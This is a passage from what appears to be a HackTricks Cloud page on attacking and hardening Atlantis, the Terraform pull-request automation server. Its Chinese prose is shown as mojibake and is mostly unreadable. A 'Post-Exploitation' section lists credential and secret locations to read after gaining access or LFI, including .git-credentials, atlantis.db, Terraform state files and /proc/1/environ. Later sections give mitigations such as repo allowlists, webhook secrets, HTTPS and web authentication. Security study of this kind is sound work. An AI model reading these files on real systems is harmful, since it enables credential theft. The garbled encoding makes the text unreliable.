* ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µï¼Œè¯·å…è®¸ [Bitbucket çš„ IP åœ°å€](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html)ï¼ˆè¯·å‚è§å‡ºç«™ IPv4 åœ°å€ï¼‰ã€‚

### Post-Exploitation

å¦‚æœæ‚¨è®¾æ³•è®¿é—®äº†æœåŠ¡å™¨ï¼Œæˆ–è€…è‡³å°‘è·å¾—äº† LFIï¼Œæœ‰ä¸€äº›æœ‰è¶£çš„å†…å®¹æ‚¨åº”è¯¥å°è¯•è¯»å–ï¼š

* `/home/atlantis/.git-credentials` åŒ…å« vcs è®¿é—®å‡­æ®
* `/atlantis-data/atlantis.db` åŒ…å«æ›´å¤šä¿¡æ¯çš„ vcs è®¿é—®å‡­æ®
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform çŠ¶æ€æ–‡ä»¶
* ç¤ºä¾‹ï¼š/atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` ç¯å¢ƒå˜é‡
* `/proc/[2-20]/cmdline` `atlantis server` çš„å‘½ä»¤è¡Œï¼ˆå¯èƒ½åŒ…å«æ•æ„Ÿæ•°æ®ï¼‰

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

å› ä¸ºä»»ä½•äººéƒ½å¯ä»¥åœ¨å…¬å…±æ‹‰å–è¯·æ±‚ä¸Šè¯„è®ºï¼Œå³ä½¿æœ‰æ‰€æœ‰å¯ç”¨çš„å®‰å…¨ç¼“è§£æªæ–½ï¼Œåœ¨æ²¡æœ‰é€‚å½“é…ç½®å®‰å…¨è®¾ç½®çš„æƒ…å†µä¸‹åœ¨å…¬å…±ä»“åº“ä¸Šè¿è¡Œ Atlantis ä»ç„¶æ˜¯å±é™©çš„ã€‚

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

å¦‚æœæ‚¨åœ¨å…¬å…±ä»“åº“ä¸Šè¿è¡Œï¼ˆä¸æ¨èï¼Œè§ä¸Šæ–‡ï¼‰ï¼Œæ‚¨ä¸åº”è¯¥è®¾ç½® `--allow-fork-prs`ï¼ˆé»˜è®¤ä¸º falseï¼‰ï¼Œå› ä¸ºä»»ä½•äººéƒ½å¯ä»¥ä»ä»–ä»¬çš„ fork å‘æ‚¨çš„ä»“åº“æ‰“å¼€æ‹‰å–è¯·æ±‚ã€‚

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis è¦æ±‚æ‚¨é€šè¿‡ `--repo-allowlist` æ ‡å¿—æŒ‡å®šä¸€ä¸ªå…è®¸åˆ—è¡¨ï¼Œæ¥å—æ¥è‡ªçš„ webhookã€‚ä¾‹å¦‚ï¼š

* ç‰¹å®šä»“åº“ï¼š`--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* æ‚¨çš„æ•´ä¸ªç»„ç»‡ï¼š`--repo-allowlist=github.com/runatlantis/*`
* æ‚¨çš„ GitHub ä¼ä¸šå®‰è£…ä¸­çš„æ¯ä¸ªä»“åº“ï¼š`--repo-allowlist=github.yourcompany.com/*`
* æ‰€æœ‰ä»“åº“ï¼š`--repo-allowlist=*`ã€‚åœ¨å—ä¿æŠ¤çš„ç½‘ç»œä¸­æ—¶å¾ˆæœ‰ç”¨ï¼Œä½†å¦‚æœæ²¡æœ‰è®¾ç½® webhook secret åˆ™å¾ˆå±é™©ã€‚

æ­¤æ ‡å¿—ç¡®ä¿æ‚¨çš„ Atlantis å®‰è£…æœªä¸æ‚¨ä¸æ§åˆ¶çš„ä»“åº“ä¸€èµ·ä½¿ç”¨ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚è§ `atlantis server --help`ã€‚

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

å¦‚æœæ”»å‡»è€…æäº¤å¸¦æœ‰æ¶æ„ Terraform ä»£ç çš„æ‹‰å–è¯·æ±‚åœ¨æ‚¨çš„å¨èƒæ¨¡å‹ä¸­ï¼Œé‚£ä¹ˆæ‚¨å¿…é¡»æ„è¯†åˆ° `terraform apply` æ‰¹å‡†æ˜¯ä¸å¤Ÿçš„ã€‚å¯ä»¥ä½¿ç”¨ [`external` æ•°æ®æº](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) æˆ–é€šè¿‡æŒ‡å®šæ¶æ„æä¾›ç¨‹åºåœ¨ `terraform plan` ä¸­è¿è¡Œæ¶æ„ä»£ç ã€‚ç„¶åï¼Œè¿™æ®µä»£ç å¯èƒ½ä¼šå¤–æ³„æ‚¨çš„å‡­æ®ã€‚

ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µï¼Œæ‚¨å¯ä»¥ï¼š

1. å°†æä¾›ç¨‹åºæ‰“åŒ…åˆ° Atlantis é•œåƒä¸­æˆ–æ‰˜ç®¡å¹¶åœ¨ç”Ÿäº§ä¸­æ‹’ç»å‡ºç«™ã€‚
2. åœ¨å†…éƒ¨å®ç°æä¾›ç¨‹åºæ³¨å†Œåè®®å¹¶æ‹’ç»å…¬å…±å‡ºç«™ï¼Œè¿™æ ·æ‚¨å¯ä»¥æ§åˆ¶è°æœ‰å†™å…¥æ³¨å†Œè¡¨çš„æƒé™ã€‚
3. ä¿®æ”¹æ‚¨çš„ [æœåŠ¡å™¨ç«¯ä»“åº“é…ç½®](https://www.runatlantis.io/docs/server-side-repo-config.html) çš„ `plan` æ­¥éª¤ï¼Œä»¥éªŒè¯ä¸å…è®¸çš„æä¾›ç¨‹åºæˆ–æ•°æ®æºæˆ–ä¸å…è®¸ç”¨æˆ·çš„ PR çš„ä½¿ç”¨ã€‚æ‚¨è¿˜å¯ä»¥åœ¨æ­¤æ—¶æ·»åŠ é¢å¤–çš„éªŒè¯ï¼Œä¾‹å¦‚åœ¨å…è®¸ `plan` ç»§ç»­ä¹‹å‰è¦æ±‚ PR ä¸Šæœ‰â€œç‚¹èµâ€ã€‚Conftest åœ¨è¿™é‡Œå¯èƒ½ä¼šæœ‰ç”¨ã€‚

#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis åº”è¯¥é€šè¿‡ `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` ç¯å¢ƒå˜é‡è®¾ç½® webhook secretsã€‚å³ä½¿è®¾ç½®äº† `--repo-allowlist` æ ‡å¿—ï¼Œå¦‚æœæ²¡æœ‰ webhook secretï¼Œæ”»å‡»è€…ä¹Ÿå¯ä»¥ä¼ªè£…æˆå…è®¸åˆ—è¡¨ä¸­çš„ä»“åº“å‘ Atlantis å‘å‡ºè¯·æ±‚ã€‚Webhook secrets ç¡®ä¿ webhook è¯·æ±‚ç¡®å®æ¥è‡ªæ‚¨çš„ VCS æä¾›å•†ï¼ˆGitHub æˆ– GitLabï¼‰ã€‚

å¦‚æœæ‚¨ä½¿ç”¨ Azure DevOpsï¼Œè¯·æ·»åŠ åŸºæœ¬ç”¨æˆ·åå’Œå¯†ç ï¼Œè€Œä¸æ˜¯ webhook secretsã€‚

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps æ”¯æŒåœ¨æ‰€æœ‰ webhook äº‹ä»¶ä¸­å‘é€åŸºæœ¬èº«ä»½éªŒè¯å¤´ã€‚è¿™éœ€è¦ä¸ºæ‚¨çš„ webhook ä½ç½®ä½¿ç”¨ HTTPS URLã€‚

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

å¦‚æœæ‚¨ä½¿ç”¨ webhook secretsï¼Œä½†æ‚¨çš„æµé‡æ˜¯é€šè¿‡ HTTPï¼Œé‚£ä¹ˆ webhook secrets å¯èƒ½ä¼šè¢«çªƒå–ã€‚ä½¿ç”¨ `--ssl-cert-file` å’Œ `--ssl-key-file` æ ‡å¿—å¯ç”¨ SSL/HTTPSã€‚

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

å¼ºçƒˆå»ºè®®åœ¨ Web æœåŠ¡ä¸­å¯ç”¨èº«ä»½éªŒè¯ã€‚ä½¿ç”¨ `--web-basic-auth=true` å¯ç”¨ BasicAuthï¼Œå¹¶ä½¿ç”¨ `--web-username=yourUsername` å’Œ `--web-password=yourPassword` æ ‡å¿—è®¾ç½®ç”¨æˆ·åå’Œå¯†ç ã€‚

æ‚¨è¿˜å¯ä»¥å°†è¿™äº›ä½œä¸ºç¯å¢ƒå˜é‡ä¼ é€’ `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` å’Œ `ATLANTIS_WEB_PASSWORD=yourPassword`ã€‚

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
